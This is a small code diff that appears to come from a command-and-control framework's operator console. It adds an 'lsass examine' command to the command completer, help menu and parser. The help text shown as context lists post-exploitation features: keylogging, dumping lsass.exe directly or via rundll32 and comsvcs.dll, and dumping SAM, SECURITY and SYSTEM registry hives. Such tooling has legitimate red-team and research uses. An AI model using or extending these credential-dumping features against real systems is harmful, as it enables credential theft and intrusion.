@@ -103,6 +103,7 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
         'sdclt'
     },
     'lsass': {
+        'examine': None,
         'direct': None,
         'comsvcs': None
     },
@@ -211,6 +212,7 @@ def print_agent_help(os):
     keylog stop                            ->  retrieve captured keystrokes and stop keylogger
     
     --== Post Exploitation Stuff ==--
+    lsass examine                          ->  examine lsass.exe protections
     lsass direct                           ->  dump lsass.exe directly (elevation required)
     lsass comsvcs                          ->  dump lsass.exe using rundll32 and comsvcs.dll (elevation required)
     sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
@@ -382,6 +384,11 @@ def agent_screen_windows(agent_id):
                 command_dict = {
                     "command_type": "audio",
                     "record_time": record_time,
+                }
+
+            elif re.fullmatch(r"\s*lsass\s+examine", command):
+                command_dict = {
+                    "command_type": "lsass-examine",
                 }
 
             elif re.fullmatch(r"\s*lsass\s+(direct|comsvcs)", command):
